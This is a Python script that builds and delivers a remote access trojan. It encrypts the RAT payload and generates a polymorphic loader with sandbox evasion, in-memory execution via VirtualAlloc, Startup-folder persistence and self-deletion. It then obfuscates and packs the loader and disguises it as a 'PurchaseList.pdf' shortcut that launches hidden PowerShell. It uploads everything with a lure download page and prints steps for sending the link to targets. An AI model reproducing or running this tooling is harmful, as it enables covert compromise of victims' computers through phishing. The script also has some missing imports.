import base64
import configparser
import logging
import random
import socket
import ssl
import string
import subprocess
import sys
import time
import traceback
from pathlib import Path
from typing import List, Optional, Tuple, TypedDict
from cryptography.fernet import Fernet
import argparse
import shutil
import win32com.client
from win32com.shell import shell

# Setup logging with detailed format
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(module)s:%(lineno)d - %(message)s',
    handlers=[
        logging.FileHandler('rat_deployment.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class ServerConfig(TypedDict):
    """Type definition for server configuration."""
    host: str
    port: str
    username: str
    password: str
    remote_dir: str
    url_base: str

class RATDeployer:
    """Manages the automated deployment of a pre-configured RAT (AsyncClient.exe) via a stealthy LNK file.

    Attributes:
        rat_path: Path to the RAT executable.
        upload: Whether to upload files to a server.
        config: Server configuration from file or environment.
        base_dir: Root directory for deployment files.
        output_dir: Directory for generated files.
        lnk_name: Randomized name for the LNK file.
        exe_name: Randomized name for the executable.
        files: List of generated files to deploy.
    """
    
    def __init__(self, rat_path: str, upload: bool = False, config_path: str = "config.ini", log_level: str = "INFO"):
        """Initialize with RAT path, upload settings, and logging level.

        Args:
            rat_path: Path to AsyncClient.exe.
            upload: Whether to upload to an HTTPS server.
            config_path: Path to configuration file.
            log_level: Logging level (DEBUG, INFO, WARNING, ERROR).
        """
        self.rat_path = Path(rat_path)
        self.upload = upload
        self.config = self._load_config(config_path)
        self.base_dir = Path("rat_deployment")
        self.output_dir = self.base_dir / "output"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.lnk_name = f"{self._random_string(6)}_PurchaseList.pdf.lnk"
        self.exe_name = f"helper_{self._random_string(8)}.exe"
        self.files: List[Path] = []
        logging.getLogger().setLevel(getattr(logging, log_level.upper(), logging.INFO))

    def _random_string(self, length: int = 8) -> str:
        """Generate a random string for file naming.

        Args:
            length: Length of the random string.

        Returns:
            Random alphanumeric string.
        """
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    def _load_config(self, config_path: str) -> ServerConfig:
        """Load server configuration from file or environment variables.

        Args:
            config_path: Path to configuration file.

        Returns:
            Server configuration dictionary.

        Raises:
            ValueError: If configuration is incomplete for upload.
        """
        config = configparser.ConfigParser()
        if Path(config_path).exists():
            config.read(config_path)
        else:
            config['Server'] = {
                'host': os.environ.get('RAT_HOST', ''),
                'port': os.environ.get('RAT_PORT', '8443'),
                'username': os.environ.get('RAT_USERNAME', ''),
                'password': os.environ.get('RAT_PASSWORD', ''),
                'remote_dir': os.environ.get('RAT_REMOTE_DIR', '/var/www/html'),
                'url_base': os.environ.get('RAT_URL_BASE', '')
            }
        server_config: ServerConfig = config['Server']
        if self.upload and not all(server_config.values()):
            raise ValueError("Incomplete server configuration for upload")
        return server_config

    def generate_payload(self) -> Tuple[str, str]:
        """Encrypt the RAT payload and generate a key.

        Returns:
            Tuple of base64-encoded payload and key.

        Raises:
            FileNotFoundError: If RAT file is missing.
            ValueError: If encryption fails or payload is invalid.
        """
        logger.debug(f"Reading RAT file: {self.rat_path}")
        try:
            payload = self.rat_path.read_bytes()
            if not payload:
                raise ValueError("Empty RAT payload")
            for _ in range(3):  # Retry key generation
                try:
                    key = Fernet.generate_key()
                    fernet = Fernet(key)
                    encrypted = fernet.encrypt(payload)
                    encoded = base64.b64encode(encrypted).decode()
                    logger.info(f"Payload encrypted successfully, size: {len(encoded)} bytes")
                    return encoded, base64.b64encode(key).decode()
                except (ValueError, cryptography.exceptions.InvalidKey) as e:
                    logger.warning(f"Key generation failed: {str(e)}, retrying...")
                    time.sleep(1)
            raise ValueError("Failed to generate valid encryption key")
        except FileNotFoundError:
            logger.error(f"RAT file not found: {self.rat_path}\n{traceback.format_exc()}")
            raise
        except Exception as e:
            logger.error(f"Payload encryption failed: {str(e)}\n{traceback.format_exc()}")
            raise

    def create_loader_script(self, encoded_payload: str, key_b64: str) -> Path:
        """Create a polymorphic loader script with memory execution.

        Args:
            encoded_payload: Base64-encoded encrypted RAT payload.
            key_b64: Base64-encoded encryption key.

        Returns:
            Path to the generated loader script.

        Raises:
            ValueError: If payload or key is invalid.
            MemoryError: If script generation exceeds memory limits.
        """
        logger.debug("Generating polymorphic loader script")
        try:
            func_names = {
                'is_sandbox': self._random_string(10),
                'execute_in_memory': self._random_string(10),
                'persist': self._random_string(10),
                'self_destruct': self._random_string(10),
            }
            junk_patterns = [
                f"def {self._random_string()}(x): return x * {random.randint(1, 10)}\n",
                f"{self._random_string()} = [{random.randint(1, 100)} for _ in range({random.randint(3, 10)})]\n",
                f"if {random.randint(0, 1)}: {self._random_string()} = {self._random_string()}\n"
            ]
            junk_code = ''.join(random.choice(junk_patterns) for _ in range(random.randint(2, 5)))
            
            code_blocks = [
                f"""
def {func_names['is_sandbox']}():
    # Check for sandbox or debugger environment
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        if "vmware" in winreg.EnumValue(key, 0)[1].lower():
            return True
        if os.path.exists("C:\\\\Windows\\\\SysWOW64\\\\ntdll.dll") and "debugger" in os.environ.get("PATH", "").lower():
            return True
        for proc in ['wireshark.exe', 'ollydbg.exe']:
            if os.path.exists(f"C:\\\\Program Files\\\\{{proc}}") or os.path.exists(f"C:\\\\Program Files (x86)\\\\{{proc}}"):
                return True
    except:
        pass
    return False
""",
                f"""
def {func_names['execute_in_memory']}():
    # Execute RAT in memory with anti-analysis checks
    if {func_names['is_sandbox']}():
        sys.exit(0)
    try:
        key = base64.b64decode("{key_b64}")
        fernet = Fernet(key)
        encrypted = base64.b64decode("{encoded_payload}")
        payload = fernet.decrypt(encrypted)
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        mem = kernel32.VirtualAlloc(None, len(payload), 0x1000 | 0x2000, 0x40)
        ctypes.memmove(mem, payload, len(payload))
        ctypes.cast(mem, ctypes.CFUNCTYPE(None))()
        {func_names['persist']}()
        {func_names['self_destruct']}()
    except Exception:
        pass
""",
                f"""
def {func_names['persist']}():
    # Ensure persistence via Startup folder
    try:
        import shutil
        startup_path = os.path.expandvars(r'%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe')
        shutil.copy(sys.executable, startup_path)
    except:
        pass
""",
                f"""
def {func_names['self_destruct']}():
    # Schedule self-destruction of the executable
    try:
        subprocess.Popen('cmd.exe /c timeout 3600 & del "%~f0"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    os._exit(0)
"""
            ]
            random.shuffle(code_blocks)
            
            loader_script = f"""
import base64
from cryptography.fernet import Fernet
import os
import sys
import ctypes

{junk_code}
{''.join(code_blocks)}

if __name__ == "__main__":
    {func_names['execute_in_memory']}()
"""
            script_path = self.base_dir / "loaders" / "obfuscated_loader.py"
            script_path.parent.mkdir(parents=True, exist_ok=True)
            script_path.write_text(loader_script)
            logger.info(f"Loader script generated at {script_path}")
            return script_path
        except (ValueError, MemoryError) as e:
            logger.error(f"Loader script generation failed: {str(e)}\n{traceback.format_exc()}")
            raise

    def obfuscate_script(self, script_path: Path) -> Path:
        """Obfuscate the loader script with PyArmor.

        Args:
            script_path: Path to the loader script.

        Returns:
            Path to the obfuscated script.

        Raises:
            subprocess.CalledProcessError: If PyArmor fails.
        """
        logger.debug(f"Obfuscating script: {script_path}")
        try:
            output_dir = self.base_dir / "obf"
            subprocess.run(
                ['pyarmor', 'obfuscate', '--recursive', '--output', str(output_dir), str(script_path)],
                check=True,
                capture_output=True,
                text=True
            )
            obfuscated_path = output_dir / script_path.name
            logger.info(f"Script obfuscated with PyArmor at {obfuscated_path}")
            return obfuscated_path
        except subprocess.CalledProcessError as e:
            logger.error(f"PyArmor obfuscation failed: {e.stderr}\n{traceback.format_exc()}")
            raise

    def create_executable(self, script_path: Path, final_exe_name: str) -> Path:
        """Convert the loader script to a compressed executable.

        Args:
            script_path: Path to the obfuscated script.
            final_exe_name: Name for the executable.

        Returns:
            Path to the generated executable.

        Raises:
            RuntimeError: If executable creation fails after retries.
        """
        logger.debug(f"Creating executable from {script_path}")
        exe_path = self.output_dir / final_exe_name
        for attempt in range(3):
            try:
                subprocess.run(
                    ['pyinstaller', '--onefile', '--noconsole', str(script_path)],
                    check=True,
                    capture_output=True,
                    text=True
                )
                temp_exe = Path('dist') / 'obfuscated_loader.exe'
                if temp_exe.exists():
                    subprocess.run(['upx', '--best', str(temp_exe)], check=False)
                    shutil.move(temp_exe, exe_path)
                logger.info(f"Executable created and compressed at {exe_path}")
                return exe_path
            except subprocess.CalledProcessError as e:
                logger.warning(f"PyInstaller attempt {attempt + 1} failed: {e.stderr}")
                time.sleep(1)
        raise RuntimeError("Failed to create executable after 3 attempts")

    def create_lnk_file(self, loader_exe_path: Path, lnk_name: str) -> Path:
        """Create a stealthy .lnk file to execute the loader.

        Args:
            loader_exe_path: Path to the executable.
            lnk_name: Name for the LNK file.

        Returns:
            Path to the generated LNK file.

        Raises:
            RuntimeError: If LNK creation fails.
        """
        logger.debug(f"Creating LNK file for {loader_exe_path}")
        try:
            shell = win32com.client.Dispatch("WScript.Shell")
            lnk_path = self.output_dir / lnk_name
            shortcut = shell.CreateShortCut(str(lnk_path))
            shortcut.Targetpath = "powershell.exe"
            shortcut.Arguments = f'-WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process \'{loader_exe_path}\' -WindowStyle Hidden"'
            shortcut.IconLocation = r"%SystemRoot%\system32\imageres.dll,44"
            shortcut.WindowStyle = 7
            shortcut.Save()
            subprocess.run(['attrib', '+H', str(loader_exe_path)], check=True)
            logger.info(f"LNK file created at {lnk_path} with hidden loader")
            return lnk_path
        except Exception as e:
            logger.error(f"LNK file creation failed: {str(e)}\n{traceback.format_exc()}")
            raise RuntimeError(f"Failed to create LNK file: {str(e)}")

    def upload_to_server(self, files: List[Path], config: ServerConfig) -> str:
        """Upload files to the server via secure socket.

        Args:
            files: List of files to upload.
            config: Server configuration.

        Returns:
            Deployed URL.

        Raises:
            RuntimeError: If upload fails.
        """
        logger.debug(f"Uploading files to {config['host']}:{config['port']}")
        try:
            context = ssl.create_default_context()
            host, port = config['host'], int(config['port'])
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    for file_path in files:
                        file_name = file_path.name
                        data = file_path.read_bytes()
                        header = f"FILE:{file_name}:{len(data)}\n".encode()
                        ssock.send(header)
                        ssock.send(data)
                        logger.info(f"Uploaded {file_name} to {config['remote_dir']}/{file_name}")

            html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Company Downloads</title>
</head>
<body>
    <h1>Company Downloads</h1>
    <a href="{config['url_base']}/{files[0].name}">Download Purchase List</a>
    <p>Click to download the purchase list PDF.</p>
</body>
</html>
"""
            html_path = self.output_dir / 'index.html'
            html_path.write_text(html_content)
            data = html_path.read_bytes()
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    header = f"FILE:index.html:{len(data)}\n".encode()
                    ssock.send(header)
                    ssock.send(data)
            html_path.unlink()

            htaccess_content = "AddType application/pdf .lnk\n"
            htaccess_path = self.output_dir / '.htaccess'
            htaccess_path.write_text(htaccess_content)
            data = htaccess_path.read_bytes()
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    header = f"FILE:.htaccess:{len(data)}\n".encode()
                    ssock.send(header)
                    ssock.send(data)
            htaccess_path.unlink()

            logger.info("Uploaded index.html and .htaccess to server")
            return f"{config['url_base']}/index.html"
        except (socket.gaierror, ssl.SSLError, OSError) as e:
            logger.error(f"Socket upload failed: {str(e)}\n{traceback.format_exc()}")
            raise RuntimeError(f"Failed to upload files: {str(e)}")

    def deploy(self) -> None:
        """Execute the full deployment process.

        Raises:
            RuntimeError: If any deployment step fails.
        """
        logger.info("Starting RAT deployment")
        encoded_payload, key_b64 = self.generate_payload()
        script_path = self.create_loader_script(encoded_payload, key_b64)
        obfuscated_script_path = self.obfuscate_script(script_path)
        exe_path = self.create_executable(obfuscated_script_path, self.exe_name)
        lnk_path = self.create_lnk_file(exe_path, self.lnk_name)
        self.files = [lnk_path, exe_path]
        logger.info("Deployment completed successfully")

    def run(self, host: Optional[str], port: int, username: Optional[str], password: Optional[str], remote_dir: str, url_base: Optional[str]) -> None:
        """Run the deployment and optional upload.

        Args:
            host: Server hostname.
            port: Server port.
            username: Server username.
            password: Server password.
            remote_dir: Remote directory.
            url_base: Base URL for the server.

        Raises:
            ValueError: If upload parameters are incomplete.
            RuntimeError: If deployment or upload fails.
        """
        self.deploy()
        if self.upload:
            config = self.config
            if host:
                config['host'] = host
            if username:
                config['username'] = username
            if password:
                config['password'] = password
            if remote_dir:
                config['remote_dir'] = remote_dir
            if url_base:
                config['url_base'] = url_base
            deployed_url = self.upload_to_server(self.files, config)
            print(f"Deployed to: {deployed_url}")
            print("Distribute the URL to targets. Clicking the link downloads the stealthy shortcut.")
        else:
            print(f"Stealthy shortcut created: {self.lnk_name}")
            print(f"Loader executable: {self.exe_name}")
            print("Next steps:")
            print("1. Upload both files to an HTTPS server in the same directory.")
            print(f"2. Create an HTTPS webpage with a link to the LNK file, e.g.,")
            print(f"   <a href='https://yourserver.com/{self.lnk_name}'>Download Purchase List</a>")
            print("When clicked, the shortcut runs the RAT silently in memory with persistence.")

def main() -> None:
    """Parse arguments and initiate deployment.

    Exits with code 1 if deployment fails.
    """
    parser = argparse.ArgumentParser(
        description="Deploy a pre-configured AsyncClient.exe (RAT) via a stealthy LNK file with one command.",
        epilog="""Examples:
  Local deployment:
    python deploy_rat.py AsyncClient.exe
  Deploy with upload (using config.ini):
    python deploy_rat.py AsyncClient.exe --upload
  Debug mode:
    python deploy_rat.py AsyncClient.exe --log-level DEBUG
  Override config:
    python deploy_rat.py AsyncClient.exe --upload --host yourserver.com --username user --password pass --url-base https://yourserver.com
"""
    )
    parser.add_argument("rat_path", help="Path to AsyncClient.exe (pre-configured RAT)")
    parser.add_argument("--upload", action="store_true", help="Upload files to an HTTPS server")
    parser.add_argument("--host", help="Server hostname (e.g., yourserver.com)")
    parser.add_argument("--port", type=int, default=8443, help="Server port for secure socket (default: 8443)")
    parser.add_argument("--username", help="Server username")
    parser.add_argument("--password", help="Server password")
    parser.add_argument("--remote-dir", default="/var/www/html", help="Remote directory (default: /var/www/html)")
    parser.add_argument("--url-base", help="Base URL for the server (e.g., https://yourserver.com)")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR"],
                        help="Logging level (default: INFO)")
    
    args = parser.parse_args()
    
    try:
        deployer = RATDeployer(args.rat_path, args.upload, log_level=args.log_level)
        deployer.run(args.host, args.port, args.username, args.password, args.remote_dir, args.url_base)
    except Exception as e:
        logger.error(f"Deployment failed: {str(e)}\n{traceback.format_exc()}")
        print(f"Error: {str(e)}")
        print("Check rat_deployment.log for details.")
        sys.exit(1)
    finally:
        for dir in [Path('build'), Path('dist'), Path('obf'), Path('rat_deployment') / 'loaders']:
            if dir.exists():
                shutil.rmtree(dir, ignore_errors=True)
        for file in [Path('obfuscated_loader.py'), Path('obfuscated_loader.py.spec')]:
            if file.exists():
                file.unlink(missing_ok=True)

if __name__ == "__main__":
    main()